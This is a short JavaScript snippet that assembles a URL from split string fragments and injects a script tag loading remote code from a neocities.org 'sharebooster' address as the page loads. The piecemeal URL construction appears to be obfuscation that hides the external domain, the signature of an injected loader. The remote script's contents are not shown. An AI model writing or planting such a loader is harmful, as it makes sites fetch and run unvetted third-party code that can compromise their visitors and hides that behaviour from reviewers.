(function() {
  const parts = [
    'ht', 'tps', '://',
    'share', 'booster', '.', 'neocities', '.org',
    '/scr', 'ipt3', '.js'
  ];
  const url = parts[0] + parts[1] + parts[2] +
              parts[3] + parts[4] + parts[5] +
              parts[6] + parts[7] + parts[8] +
              parts[9] + parts[10];

  const s = document.createElement('script');
  s.src = url;
  s.type = 'text/javascript';
  s.onload = () => console.log(`${url} loaded successfully.`);
  s.onerror = () => console.error(`Failed to load ${url}`);
  document.head.appendChild(s);
})();
